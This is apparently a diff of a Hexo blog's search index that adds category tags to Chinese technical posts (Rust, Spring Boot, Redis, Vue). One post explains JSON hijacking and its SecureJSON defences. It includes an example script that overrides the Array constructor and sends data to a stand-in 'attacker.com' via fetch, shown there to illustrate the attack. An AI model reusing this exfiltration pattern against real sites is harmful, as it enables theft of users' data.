@@ -14,6 +14,9 @@
 <li><a href="https://github.com/yuaotian/go-cursor-help">go-cursor-help</a></li>
 </ul>
 ]]></content>
+      <tags>
+        <tag>toy</tag>
+      </tags>
   </entry>
   <entry>
     <title>hexo框架搭建个人博客</title>
@@ -78,6 +81,9 @@
 <p>等待部署完成后，打开浏览器，输入<code>https://用户名.github.io</code>即可访问博客。</p>
 <h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>至此，hexo框架搭建个人博客的过程已经介绍完毕，希望对你有所帮助。</p>
 ]]></content>
+      <tags>
+        <tag>toy</tag>
+      </tags>
   </entry>
   <entry>
     <title>Vue3 + Vite项目工程化搭建</title>
@@ -103,6 +109,9 @@
 <li><a href="https://blog.csdn.net/m0_74825447/article/details/144637339">手把手完成前端Vue3 + Vite项目工程化搭建</a></li>
 </ul>
 ]]></content>
+      <tags>
+        <tag>vue</tag>
+      </tags>
   </entry>
   <entry>
     <title>使用宝塔部署前后端项目</title>
@@ -171,6 +180,9 @@
     }
   </style>
 ]]></content>
+      <tags>
+        <tag>vue</tag>
+      </tags>
   </entry>
   <entry>
     <title>gorm-mysql数组类型的处理方法</title>
@@ -185,6 +197,9 @@
 <p>例如：<code>1,2,3,4,5</code></p>
 <p>之后读取的时候，使用<code>strings.Split</code>来处理。</p>
 <h3 id="其他方法（待补充）"><a href="#其他方法（待补充）" class="headerlink" title="其他方法（待补充）"></a>其他方法（待补充）</h3>]]></content>
+      <tags>
+        <tag>go</tag>
+      </tags>
   </entry>
   <entry>
     <title>SecureJSON-防范JSON劫持</title>
@@ -210,8 +225,11 @@
 </li>
 <li><p><strong>覆盖 JavaScript 内置对象</strong><br>攻击者可以覆盖 <code>Array</code> 构造函数或 <code>Object.defineProperty</code>，在 JSON 数据解析时触发恶意代码。  </p>
 <ul>
-<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 恶意网站覆盖 Array 构造函数</span></span><br><span class="line">  <span class="keyword">var</span> originalArray = <span class="title class_">Array</span>;</span><br><span class="line">  <span class="title class_">Array</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title function_">originalArray</span>();</span><br><span class="line">    arr.<span class="property">push</span> = <span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">      <span class="comment">// 窃取数据并发送到攻击者服务器</span></span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com?data=&#x27;</span> + value);</span><br><span class="line">      <span class="keyword">return</span> originalArray.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, value);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- 加载目标网站的 <span class="title class_">JSON</span> 数据 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
-<li>如果 <code>data.json</code> 返回 <code>[&#123;&quot;id&quot;: 1&#125;]</code>，浏览器会将其解析为数组，触发被覆盖的 <code>Array</code> 构造函数，导致数据泄露。</li>
+<li><p><strong>示例</strong>：  </p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 恶意网站覆盖 Array 构造函数</span></span><br><span class="line">  <span class="keyword">var</span> originalArray = <span class="title class_">Array</span>;</span><br><span class="line">  <span class="title class_">Array</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title function_">originalArray</span>();</span><br><span class="line">    arr.<span class="property">push</span> = <span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">      <span class="comment">// 窃取数据并发送到攻击者服务器</span></span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com?data=&#x27;</span> + value);</span><br><span class="line">      <span class="keyword">return</span> originalArray.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, value);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- 加载目标网站的 <span class="title class_">JSON</span> 数据 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果 <code>data.json</code> 返回 <code>[&#123;&quot;id&quot;: 1&#125;]</code>，浏览器会将其解析为数组，触发被覆盖的 <code>Array</code> 构造函数，导致数据泄露。</p>
+</li>
 </ul>
 </li>
 </ol>
@@ -219,13 +237,19 @@
 <h3 id="三、SecureJSON-如何防御-JSON-劫持？"><a href="#三、SecureJSON-如何防御-JSON-劫持？" class="headerlink" title="三、SecureJSON 如何防御 JSON 劫持？"></a><strong>三、SecureJSON 如何防御 JSON 劫持？</strong></h3><p>SecureJSON 的核心思想是<strong>破坏 JSON 数据的直接解析</strong>，使其无法被攻击者利用。以下是具体手段：</p>
 <h4 id="1-添加无害前缀"><a href="#1-添加无害前缀" class="headerlink" title="1. 添加无害前缀"></a>1. <strong>添加无害前缀</strong></h4><p>   服务器在返回 JSON 数据前，添加一段无法被 JavaScript 直接解析的前缀。  </p>
 <ul>
-<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;id&quot;: 1&#125;</span></span><br></pre></td></tr></table></figure></li>
-<li><strong>作用</strong>：当浏览器通过 <code>&lt;script&gt;</code> 标签加载此数据时，前缀会导致语法错误，阻止后续脚本执行。</li>
+<li><p><strong>示例</strong>：  </p>
+   <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;id&quot;: 1&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>作用</strong>：当浏览器通过 <code>&lt;script&gt;</code> 标签加载此数据时，前缀会导致语法错误，阻止后续脚本执行。</p>
+</li>
 </ul>
 <h4 id="2-强制非数组格式"><a href="#2-强制非数组格式" class="headerlink" title="2. 强制非数组格式"></a>2. <strong>强制非数组格式</strong></h4><p>   将 JSON 数据包装为非数组形式（如对象），避免触发 <code>Array</code> 构造函数。  </p>
 <ul>
-<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;data&quot;</span>: [&#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;]&#125;</span><br></pre></td></tr></table></figure></li>
-<li><strong>作用</strong>：攻击者需要访问 <code>data</code> 属性才能获取数组，而由于同源策略限制，跨域脚本无法直接读取对象的属性。</li>
+<li><p><strong>示例</strong>：  </p>
+   <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;data&quot;</span>: [&#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>作用</strong>：攻击者需要访问 <code>data</code> 属性才能获取数组，而由于同源策略限制，跨域脚本无法直接读取对象的属性。</p>
+</li>
 </ul>
 <h4 id="3-结合内容类型（Content-Type）"><a href="#3-结合内容类型（Content-Type）" class="headerlink" title="3. 结合内容类型（Content-Type）"></a>3. <strong>结合内容类型（Content-Type）</strong></h4><p>   服务器设置响应头 <code>Content-Type: application/json</code>，明确告知浏览器这是 JSON 数据（而非可执行的 JavaScript）。  </p>
 <ul>
@@ -247,8 +271,11 @@
 </li>
 <li><p><strong>合法前端代码处理 SecureJSON</strong>  </p>
 <ul>
-<li>前端需要手动移除前缀并解析 JSON：  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://victim.com/data.json&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text.<span class="title function_">replace</span>(<span class="regexp">/^\)\]\&#125;&#x27;/</span>, <span class="string">&#x27;&#x27;</span>)));</span><br></pre></td></tr></table></figure></li>
-<li><strong>关键点</strong>：只有合法前端知道如何处理 SecureJSON 格式，攻击者无法利用自动解析机制。</li>
+<li><p>前端需要手动移除前缀并解析 JSON：  </p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://victim.com/data.json&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text.<span class="title function_">replace</span>(<span class="regexp">/^\)\]\&#125;&#x27;/</span>, <span class="string">&#x27;&#x27;</span>)));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>关键点</strong>：只有合法前端知道如何处理 SecureJSON 格式，攻击者无法利用自动解析机制。</p>
+</li>
 </ul>
 </li>
 </ol>
@@ -267,6 +294,9 @@
 <p>这种方法在兼容旧浏览器的同时，有效防御了 JSON 劫持攻击，是 Web 安全中一种经典的“无害化”设计思路。</p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h3><p><a href="https://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses#:~:text=In%20the%20most%20simple%20terms,key%20will%20be%20consistently%20dismissed">Why does Google prepend while(1); to their JSON responses?</a></p>
 ]]></content>
+      <tags>
+        <tag>javascript</tag>
+      </tags>
   </entry>
   <entry>
     <title>rust-ownership的分析</title>
@@ -314,6 +344,9 @@
 </ul>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Rust 让人省心…</p>
 ]]></content>
+      <tags>
+        <tag>rust</tag>
+      </tags>
   </entry>
   <entry>
     <title>rust-copy_trait的分析</title>
@@ -355,6 +388,9 @@
 <li>Clone Trait 适用于所有类型，通过调用 <code>clone</code> 方法来复制值，会转移所有权，但是可以自定义复制行为。</li>
 </ul>
 ]]></content>
+      <tags>
+        <tag>rust</tag>
+      </tags>
   </entry>
   <entry>
     <title>Redis-缓存</title>
@@ -495,6 +531,9 @@
     }
   </style>
 ]]></content>
+      <tags>
+        <tag>redis</tag>
+      </tags>
   </entry>
   <entry>
     <title>linux下使用zsh以及oh-my-zsh</title>
@@ -518,6 +557,9 @@
 <p>才能生效。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果windows默认shell是zsh该多好啊…</p>
 ]]></content>
+      <tags>
+        <tag>toy</tag>
+      </tags>
   </entry>
   <entry>
     <title>一人一单问题</title>
@@ -589,6 +631,9 @@
 <li><strong>消息队列</strong>：使用消息队列来异步处理订单，减少数据库的压力。<br>…</li>
 </ul>
 ]]></content>
+      <tags>
+        <tag>redis</tag>
+      </tags>
   </entry>
   <entry>
     <title>aop</title>
@@ -669,6 +714,9 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;before&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;方法名：&#123;&#125;&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">        log.info(<span class="string">&quot;参数：&#123;&#125;&quot;</span>, joinPoint.getArgs());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.demo.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 获取类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> joinPoint.getTarget().getClass().getName();</span><br><span class="line">        log.info(<span class="string">&quot;类名：&#123;&#125;&quot;</span>, className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取方法名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">        log.info(<span class="string">&quot;方法名：&#123;&#125;&quot;</span>, methodName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取参数</span></span><br><span class="line">        Object[] args = joinPoint.getArgs();</span><br><span class="line">        log.info(<span class="string">&quot;参数：&#123;&#125;&quot;</span>, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行 获取返回值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> joinPoint.proceed();</span><br><span class="line">        log.info(<span class="string">&quot;返回值：&#123;&#125;&quot;</span>, result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>spring boot</tag>
+      </tags>
   </entry>
   <entry>
     <title>rust-Vec存储不同数据类型的几种方法</title>
@@ -683,6 +731,9 @@
 <li>使用第三方库，如<code>enum-dispatch</code>…</li>
 </ul>
 ]]></content>
+      <tags>
+        <tag>rust</tag>
+      </tags>
   </entry>
   <entry>
     <title>事务-@transactional注解</title>
@@ -718,6 +769,9 @@
 
 <p>以上代码需求为：无论是否删除部门成功，都要记录日志，如果删除部门失败，日志也要记录，所以需要使用REQUIRES_NEW传播行为，这样无论删除部门是否成功，都会记录日志。</p>
 ]]></content>
+      <tags>
+        <tag>redis</tag>
+      </tags>
   </entry>
   <entry>
     <title>bv-downloader</title>
@@ -745,6 +799,9 @@
 </ul>
 <p>…</p>
 ]]></content>
+      <tags>
+        <tag>project</tag>
+      </tags>
   </entry>
   <entry>
     <title>springboot</title>
@@ -914,6 +971,9 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(name = &quot;spring.datasource.url&quot;)</span> <span class="comment">// 当配置文件中存在spring.datasource.url属性时，才会加载当前bean</span></span><br><span class="line"><span class="keyword">public</span> BeanObject <span class="title function_">beanObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BeanObject</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <tags>
+        <tag>spring boot</tag>
+      </tags>
   </entry>
   <entry>
     <title>springboot starter diy</title>
@@ -948,6 +1008,9 @@
 <p>然后就可以使用@Autowired注入AliOSSUtils类，调用方法上传文件了…</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说实话，真的会在实际项目中用到这个东西吗？不过了解一下也是好的，毕竟springboot的自动配置机制是非常强大的，可以帮助我们简化很多工作…</p>
 ]]></content>
+      <tags>
+        <tag>spring boot</tag>
+      </tags>
   </entry>
   <entry>
     <title>jwt</title>
@@ -986,6 +1049,9 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"><span class="keyword">import</span> com.dunjia.back.utils.JwtInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtInterceptor jwtInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(jwtInterceptor)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/api/**&quot;</span>)  <span class="comment">// 拦截所有/api/**的请求</span></span><br><span class="line">                .excludePathPatterns(        <span class="comment">// 不拦截以下路径</span></span><br><span class="line">                        <span class="string">&quot;/api/login&quot;</span>,        <span class="comment">// 登录接口</span></span><br><span class="line">                        <span class="string">&quot;/api/register&quot;</span>,     <span class="comment">// 注册接口</span></span><br><span class="line">                        <span class="string">&quot;/api/upload&quot;</span>,       <span class="comment">// 上传图片接口</span></span><br><span class="line">                        <span class="string">&quot;/image/**&quot;</span>          <span class="comment">// 静态资源</span></span><br><span class="line">                );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <tags>
+        <tag>spring boot</tag>
+      </tags>
   </entry>
   <entry>
     <title>mail</title>
@@ -1007,6 +1073,9 @@
 
 <p>…</p>
 ]]></content>
+      <tags>
+        <tag>spring boot</tag>
+      </tags>
   </entry>
   <entry>
     <title>diffusion model</title>
@@ -1342,6 +1411,9 @@
 </ul>
 <p>因此，扩散模型的意义在于<strong>通过UNet的预测能力，将随机噪声逐步转化为符合数据分布的样本</strong>，而这一过程无法通过直接使用前向噪声实现。</p>
 <h2 id="wait-to-be-continued…"><a href="#wait-to-be-continued…" class="headerlink" title="wait to be continued…"></a>wait to be continued…</h2>]]></content>
+      <tags>
+        <tag>science</tag>
+      </tags>
   </entry>
   <entry>
     <title>diffusion-model small example</title>
@@ -1350,6 +1422,9 @@
 
 <p>具体解释待补充…</p>
 ]]></content>
+      <tags>
+        <tag>science</tag>
+      </tags>
   </entry>
   <entry>
     <title>rust-web</title>
@@ -1411,6 +1486,9 @@
 <p><img src="/images/image27.png" alt="alt text"></p>
 <h3 id="3-rustwasm-actix-web"><a href="#3-rustwasm-actix-web" class="headerlink" title="3. rustwasm + actix-web"></a>3. rustwasm + actix-web</h3><p>learning…</p>
 ]]></content>
+      <tags>
+        <tag>rust</tag>
+      </tags>
   </entry>
   <entry>
     <title>wasm-app 踩坑</title>
@@ -1477,6 +1555,9 @@
 <p><img src="/images/image26.png" alt="alt text"></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://rustwasm.github.io/docs/book/game-of-life/hello-world.html">rustwasm</a></p>
 ]]></content>
+      <tags>
+        <tag>rust</tag>
+      </tags>
   </entry>
   <entry>
     <title>分布式并发安全-引入</title>
